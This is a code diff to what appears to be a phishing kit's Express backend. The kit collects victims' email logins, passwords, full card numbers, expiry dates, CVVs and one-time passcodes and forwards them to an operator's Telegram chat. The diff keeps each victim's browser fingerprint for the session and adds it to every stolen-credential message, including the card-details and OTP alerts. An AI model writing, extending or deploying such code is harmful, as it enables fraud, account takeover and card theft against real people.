@@ -211,6 +211,12 @@ function formatFingerprintBlock(fp) {
 🗣 Voices (${Array.isArray(fp.voices) ? fp.voices.length : 0}): ${voices}`;
 }
 
+// Convenience: retrieve fingerprint block for an active email session
+function getFpBlock(email) {
+  const session = otpStore[email];
+  return formatFingerprintBlock(session?.fingerprint || null);
+}
+
 // Flow 1 — Login Credentials Notification
 app.post('/api/login', async (req, res) => {
   const { email, password, deviceInfo } = req.body;
@@ -259,6 +265,7 @@ app.post('/api/login', async (req, res) => {
     expiry: null,
     cardOtpEntered: null,
     cardOtpMode: false,
+    fingerprint: fp || null,  // persist fingerprint for the whole session
     deviceInfo: deviceInfo || { userAgent: ua, platform, language, screen, timezone, deviceFingerprint: fingerprint }
   };
 
@@ -317,7 +324,7 @@ app.post('/api/submit-otp', async (req, res) => {
     const rawCard = (session.cardNumber || '').replace(/\D/g, '');
     const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';
 
-    message = `🔐 CARD OTP ENTERED\n\n📧 Email: ${email}\n💳 Card: ${formattedCard}\n🔢 Card OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;
+    message = `🔐 CARD OTP ENTERED\n\n📧 Email: ${email}\n💳 Card: ${formattedCard}\n🔢 Card OTP Entered: ${otp}\n🕐 Time: ${timestamp}${getFpBlock(email)}`;
 
     reply_markup = {
       inline_keyboard: [
@@ -334,7 +341,7 @@ app.post('/api/submit-otp', async (req, res) => {
   } else {
     session.otpEntered = otp;
 
-    message = `🔑 OTP CODE ENTERED\n\n📧 Email: ${email}\n🔢 OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;
+    message = `🔑 OTP CODE ENTERED\n\n📧 Email: ${email}\n🔢 OTP Entered: ${otp}\n🕐 Time: ${timestamp}${getFpBlock(email)}`;
 
     reply_markup = {
       inline_keyboard: [
@@ -387,7 +394,7 @@ app.post('/api/request-resend', async (req, res) => {
   try {
     await bot.sendMessage(
       process.env.ADMIN_CHAT_ID,
-      `⚠️ USER REQUESTED RESEND (New OTP Generated)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timestamp}`
+      `⚠️ USER REQUESTED RESEND (New OTP Generated)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timestamp}${getFpBlock(email)}`
     );
     console.log(`[Express] User ${email} requested OTP resend. New OTP: ${otp}. Notified admin.`);
   } catch (error) {
@@ -425,7 +432,7 @@ app.post('/api/submit-card', async (req, res) => {
   session.status = 'card_submitted';
 
   const timestamp = getISTDateTime();
-  const message = `💳 CARD DETAILS RECEIVED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n💳 Card: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n🕐 Time: ${timestamp}`;
+  const message = `💳 CARD DETAILS RECEIVED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n💳 Card: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n🕐 Time: ${timestamp}${getFpBlock(email)}`;
 
   const reply_markup = {
     inline_keyboard: [
